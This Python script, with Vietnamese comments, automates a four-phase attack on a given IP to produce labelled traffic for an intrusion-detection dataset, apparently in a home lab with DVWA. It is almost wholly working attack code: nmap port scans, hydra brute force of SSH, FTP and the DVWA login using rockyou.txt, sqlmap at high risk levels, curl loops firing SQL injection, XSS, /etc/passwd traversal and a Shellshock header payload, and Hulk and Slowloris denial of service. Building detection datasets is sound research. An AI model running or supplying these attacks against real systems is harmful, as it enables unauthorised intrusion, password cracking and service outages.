#!/usr/bin/env python3
"""
auto_attack_v3.py - Balanced Attack Script cho Run7
===================================================
Mục tiêu: ~17,500 flows mỗi loại tấn công (PortScan, Brute Force, Web Attack, DoS)
Tổng thời gian tấn công: ~45-50 phút
Tỉ lệ dataset: Benign 80% - Attack 20% (khi kết hợp với auto_benign_v2.py)

Cách chạy:
    python3 auto_attack_v3.py --target 192.168.0.105 --run-name run7
    python3 auto_attack_v3.py --target 192.168.0.105 --run-name run7 --phase portscan  # chỉ chạy 1 phase
"""

import subprocess
import time
import os
import csv
import random
import argparse
import shutil
from datetime import datetime


def current_time_ms():
    return int(time.time() * 1000)


def check_tools():
    """Kiểm tra các công cụ cần thiết"""
    tools = {
        'nmap': 'sudo apt install nmap',
        'hydra': 'sudo apt install hydra',
        'sqlmap': 'sudo apt install sqlmap',
        'slowloris': 'pip3 install slowloris',
        'curl': 'sudo apt install curl',
    }
    missing = []
    for tool, install_cmd in tools.items():
        if not shutil.which(tool):
            missing.append(f"  - {tool}: {install_cmd}")
    
    if missing:
        print("[!] THIẾU CÔNG CỤ:")
        for m in missing:
            print(m)
        print("\nCài đặt rồi chạy lại.")
        return False
    
    # Kiểm tra rockyou.txt
    if not os.path.exists('/usr/share/wordlists/rockyou.txt'):
        print("[!] Thiếu /usr/share/wordlists/rockyou.txt")
        print("    Chạy: sudo gunzip /usr/share/wordlists/rockyou.txt.gz")
        return False
    
    # Kiểm tra hulk
    if not os.path.exists('./hulk/hulk.py'):
        print("[⚠] Thiếu ./hulk/hulk.py - Phase DoS Hulk sẽ bị bỏ qua")
    
    return True


def run_attack(command, attack_type, dst_ip, dst_port, description, log_writer, attack_num, total):
    """Chạy 1 lệnh tấn công và ghi log ground truth"""
    print(f"\n{'─'*60}")
    print(f"  [{attack_num}/{total}] {attack_type}: {description}")
    print(f"  CMD: {command[:100]}{'...' if len(command) > 100 else ''}")
    print(f"{'─'*60}")

    start_ms = current_time_ms()
    start_time = datetime.now().strftime("%H:%M:%S")

    try:
        process = subprocess.Popen(
            command, shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        process.wait()
    except KeyboardInterrupt:
        print("\n[!] Ngắt bởi người dùng")
        process.terminate()
        return False

    end_ms = current_time_ms()
    duration_s = (end_ms - start_ms) / 1000

    log_writer.writerow({
        'attack_type': attack_type,
        'src_ip': 'Attacker',
        'dst_ip': dst_ip,
        'dst_port': dst_port,
        'start_time_ms': start_ms,
        'end_time_ms': end_ms,
        'params': description
    })

    print(f"  ✓ Hoàn tất trong {duration_s:.1f}s ({start_time} → {datetime.now().strftime('%H:%M:%S')})")
    return True


def idle(min_s, max_s, reason=""):
    """Nghỉ ngơi giữa các tấn công"""
    t = random.randint(min_s, max_s)
    if reason:
        print(f"  [~] Idle {t}s ({reason})")
    else:
        print(f"  [~] Idle {t}s")
    time.sleep(t)


# ============================================================================
# PHASE 1: PORT SCAN (~17,500 flows, ~5 phút)
# Mỗi port probe = 1 flow. Scan 18,000 ports = ~18,000 flows
# ============================================================================
def phase_portscan(target, writer):
    print(f"\n{'='*60}")
    print(f"  ██ PHASE 1: PORT SCAN")
    print(f"  ██ Mục tiêu: ~17,500 flows | Thời gian ước tính: ~5 phút")
    print(f"{'='*60}")

    scans = [
        # (command, description, estimated_flows)
        # Chỉ dùng -sT (KHÔNG -sV) + --max-retries 0 để mỗi port = đúng 1 probe
        # → unique dst_port count cao, discriminative với Benign
        (f"sudo nmap -sT -T5 -p 1-5000 --max-retries 0 {target}",
         "TCP Connect scan ports 1-5000", 5000),

        (f"sudo nmap -sT -T5 -p 5001-10000 --max-retries 0 {target}",
         "TCP Connect scan ports 5001-10000", 5000),

        (f"sudo nmap -sT -T4 -p 10001-16000 --max-retries 0 {target}",
         "TCP Connect scan ports 10001-16000", 6000),
    ]

    total = len(scans)
    est_total = sum(s[2] for s in scans)

    for i, (cmd, desc, est) in enumerate(scans, 1):
        if not run_attack(cmd, "PortScan", target, "Multiple", desc, writer, i, total):
            return
        if i < total:
            idle(8, 12, "giữa các scan")

    print(f"\n  ▸ Phase 1 hoàn tất. Ước tính: ~{est_total:,} flows")


# ============================================================================
# PHASE 2: BRUTE FORCE — SSH + FTP (~17,500 flows, ~20 phút)
# SSH: ~16 attempts/s với 16 threads → ~2,400 flows per 150s
# FTP: ~20 attempts/s với 16 threads → ~2,400 flows per 120s
# ============================================================================
def phase_bruteforce(target, writer):
    print(f"\n{'='*60}")
    print(f"  ██ PHASE 2: BRUTE FORCE (SSH + FTP)")
    print(f"  ██ Mục tiêu: ~17,500 flows | Thời gian ước tính: ~20 phút")
    print(f"{'='*60}")

    attacks = [
        # SSH Brute Force - nhiều username khác nhau
        (f"timeout 150s hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 16",
         "SSH Brute root (150s, 16 threads)", "22"),

        (f"timeout 120s hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{target} -t 16",
         "FTP Brute admin (120s, 16 threads)", "21"),

        (f"timeout 150s hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 16",
         "SSH Brute admin (150s, 16 threads)", "22"),

        (f"timeout 120s hydra -l root -P /usr/share/wordlists/rockyou.txt ftp://{target} -t 16",
         "FTP Brute root (120s, 16 threads)", "21"),

        (f"timeout 150s hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 16",
         "SSH Brute user (150s, 16 threads)", "22"),

        (f"timeout 120s hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://{target} -t 16",
         "FTP Brute user (120s, 16 threads)", "21"),

        (f"timeout 150s hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 16",
         "SSH Brute ubuntu (150s, 16 threads)", "22"),

        (f"timeout 120s hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://{target} -t 16",
         "FTP Brute ftp (120s, 16 threads)", "21"),
    ]

    total = len(attacks)
    for i, (cmd, desc, port) in enumerate(attacks, 1):
        if not run_attack(cmd, "Brute Force", target, port, desc, writer, i, total):
            return
        if i < total:
            idle(8, 15, "giữa các brute force")

    print(f"\n  ▸ Phase 2 hoàn tất. Ước tính: ~16,000-20,000 flows")


# ============================================================================
# PHASE 3: WEB ATTACK — HTTP Brute + SQLi + XSS (~17,500 flows, ~15 phút)
# Không dùng nikto/dirb → thay bằng hydra HTTP + sqlmap + curl bursts
# ============================================================================
def phase_webattack(target, writer):
    print(f"\n{'='*60}")
    print(f"  ██ PHASE 3: WEB ATTACK")
    print(f"  ██ Mục tiêu: ~17,500 flows | Thời gian ước tính: ~15 phút")
    print(f"{'='*60}")

    attacks = []

    # --- HTTP Brute Force (hydra) ---
    http_endpoints = [
        ("/DVWA/login.php", "http-get"),
        ("/DVWA/", "http-get"),
        ("/DVWA/login.php", "http-form-post \"/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:failed\""),
        ("/", "http-get"),
    ]
    for endpoint, method in http_endpoints:
        if "http-form-post" in method:
            cmd = (f"timeout 90s hydra -l admin -P /usr/share/wordlists/rockyou.txt "
                   f"{target} {method} -t 24")
        else:
            cmd = (f"timeout 90s hydra -l admin -P /usr/share/wordlists/rockyou.txt "
                   f"{target} {method} {endpoint} -t 24")
        attacks.append((cmd, f"HTTP Brute {endpoint} ({method}, 24 threads)", "80"))

    # --- SQL Injection (sqlmap) ---
    sqli_configs = [
        ("--forms --batch --dbs --level=3 --risk=3", "SQLi login.php level3 risk3"),
        ("--forms --batch --dbs --level=5 --risk=3 --technique=BEUSTQ", "SQLi login.php level5 full-tech"),
        ("--forms --batch --tables --level=3 --risk=2", "SQLi login.php tables enum"),
    ]
    for params, desc in sqli_configs:
        cmd = f"timeout 90s sqlmap -u 'http://{target}/DVWA/login.php' {params}"
        attacks.append((cmd, desc, "80"))

    # --- Curl XSS/SQLi Burst (1 flow per curl) ---
    # Tạo bash script chạy curl liên tục với payload tấn công
    xss_burst_cmd = f"""timeout 60s bash -c '
        i=0
        while true; do
            i=$((i+1))
            curl -s -o /dev/null -m 1 "http://{target}/DVWA/login.php?username=admin%27OR%271%27%3D%271&password=test&Login=Login"
            curl -s -o /dev/null -m 1 "http://{target}/DVWA/login.php" -d "username=%3Cscript%3Ealert($i)%3C/script%3E&password=xss&Login=Login"
            curl -s -o /dev/null -m 1 "http://{target}/DVWA/login.php?username=admin%27+UNION+SELECT+1,2--&password=x"
            curl -s -o /dev/null -m 1 "http://{target}/DVWA/../../../etc/passwd"
            sleep 0.02
        done
    '"""
    attacks.append((xss_burst_cmd, "XSS+SQLi+Traversal curl burst #1 (60s)", "80"))

    xss_burst_cmd2 = f"""timeout 60s bash -c '
        i=0
        while true; do
            i=$((i+1))
            curl -s -o /dev/null -m 1 "http://{target}/" -H "User-Agent: () {{ :;}}; /bin/bash -c id"
            curl -s -o /dev/null -m 1 "http://{target}/DVWA/login.php" -d "username=admin&password=%27+OR+1%3D1--&Login=Login"
            curl -s -o /dev/null -m 1 "http://{target}/DVWA/setup.php"
            curl -s -o /dev/null -m 1 "http://{target}/DVWA/config/config.inc.php"
            sleep 0.02
        done
    '"""
    attacks.append((xss_burst_cmd2, "ShellShock+SQLi+Config curl burst #2 (60s)", "80"))

    total = len(attacks)
    for i, (cmd, desc, port) in enumerate(attacks, 1):
        if not run_attack(cmd, "Web Attack", target, port, desc, writer, i, total):
            return
        if i < total:
            idle(8, 12, "giữa các web attack")

    print(f"\n  ▸ Phase 3 hoàn tất. Ước tính: ~14,000-20,000 flows")


# ============================================================================
# PHASE 4: DoS — Hulk + Slowloris (~17,500 flows, ~5 phút)
# ⚠️ GIẢM MẠNH so với run5 để tránh DoS chiếm quá nhiều flow
# Hulk: ~300 flows/s → 10s = ~3,000 flows
# Slowloris: ~100 flows per session
# ============================================================================
def phase_dos(target, writer):
    print(f"\n{'='*60}")
    print(f"  ██ PHASE 4: DoS (GIẢM MẠNH)")
    print(f"  ██ Mục tiêu: ~17,500 flows | Thời gian ước tính: ~5 phút")
    print(f"{'='*60}")

    attacks = []

    # Hulk DoS - mỗi lần ngắn (10s) để kiểm soát flow count
    hulk_exists = os.path.exists("./hulk/hulk.py")
    if hulk_exists:
        for i in range(5):
            conns_label = f"burst #{i+1}"
            attacks.append((
                f"timeout 10s python3 ./hulk/hulk.py http://{target}",
                f"DoS Hulk {conns_label} (10s)", "80"
            ))
    else:
        print("  [⚠] hulk.py không tìm thấy — chỉ dùng Slowloris")

    # Slowloris DoS - connections thấp, thời gian ngắn
    slowloris_configs = [
        (80, 12),   # 80 connections, 12s
        (100, 12),  # 100 connections, 12s
        (120, 10),  # 120 connections, 10s
    ]
    for conns, duration in slowloris_configs:
        attacks.append((
            f"timeout {duration}s slowloris {target} -p 80 -s {conns}",
            f"DoS Slowloris ({conns} conn, {duration}s)", "80"
        ))

    total = len(attacks)
    for i, (cmd, desc, port) in enumerate(attacks, 1):
        if not run_attack(cmd, "DoS", target, port, desc, writer, i, total):
            return
        if i < total:
            idle(10, 15, "giữa các DoS burst")

    print(f"\n  ▸ Phase 4 hoàn tất. Ước tính: ~15,000-20,000 flows")


# ============================================================================
# MAIN
# ============================================================================
def main():
    parser = argparse.ArgumentParser(description="Auto Attack v3 — Balanced cho Run7")
    parser.add_argument("--target", required=True, help="IP Victim (ví dụ: 192.168.0.105)")
    parser.add_argument("--run-name", default="run7", help="Tên phiên chạy (mặc định: run7)")
    parser.add_argument("--phase", choices=["portscan", "bruteforce", "webattack", "dos", "all"],
                        default="all", help="Chạy 1 phase cụ thể hoặc tất cả")
    parser.add_argument("--skip-check", action="store_true", help="Bỏ qua kiểm tra công cụ")
    args = parser.parse_args()

    print(f"""
╔══════════════════════════════════════════════════════════╗
║          AUTO ATTACK v3 — Run7 Dataset Collection       ║
╠══════════════════════════════════════════════════════════╣
║  Target:     {args.target:<43}║
║  Run name:   {args.run_name:<43}║
║  Phase:      {args.phase:<43}║
║  Mục tiêu:   ~17,500 flows mỗi loại × 4 = ~70,000      ║
║  Thời gian:  ~45-50 phút                                ║
╚══════════════════════════════════════════════════════════╝
""")

    if not args.skip_check and not check_tools():
        return

    # Chuẩn bị Ground Truth log
    os.makedirs('../docs', exist_ok=True)
    log_file = f'../docs/ground_truth_log_{args.run_name}.csv'
    
    start_time = datetime.now()
    print(f"[*] Bắt đầu lúc: {start_time.strftime('%H:%M:%S')}")
    print(f"[*] Ground Truth log: {log_file}")

    file_exists = os.path.exists(log_file)
    with open(log_file, mode='a', newline='') as csvfile:
        fieldnames = ['attack_type', 'src_ip', 'dst_ip', 'dst_port',
                      'start_time_ms', 'end_time_ms', 'params']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        if not file_exists:
            writer.writeheader()

        phases = {
            'portscan': ("PHASE 1: PortScan", phase_portscan),
            'bruteforce': ("PHASE 2: Brute Force", phase_bruteforce),
            'webattack': ("PHASE 3: Web Attack", phase_webattack),
            'dos': ("PHASE 4: DoS", phase_dos),
        }

        if args.phase == 'all':
            phase_order = ['portscan', 'bruteforce', 'webattack', 'dos']
        else:
            phase_order = [args.phase]

        for i, phase_key in enumerate(phase_order):
            name, func = phases[phase_key]
            func(args.target, writer)

            if i < len(phase_order) - 1:
                gap = random.randint(20, 40)
                print(f"\n  [===] Nghỉ {gap}s giữa các Phase...")
                time.sleep(gap)

    elapsed = datetime.now() - start_time
    print(f"""
╔══════════════════════════════════════════════════════════╗
║                    HOÀN TẤT TẤN CÔNG                    ║
╠══════════════════════════════════════════════════════════╣
║  Thời gian:  {str(elapsed).split('.')[0]:<43}║
║  Log file:   {log_file:<43}║
║                                                          ║
║  ⏳ Hãy đợi benign traffic chạy thêm 10 phút nữa        ║
║     trước khi dừng toàn bộ.                              ║
╚══════════════════════════════════════════════════════════╝
""")


if __name__ == "__main__":
    main()
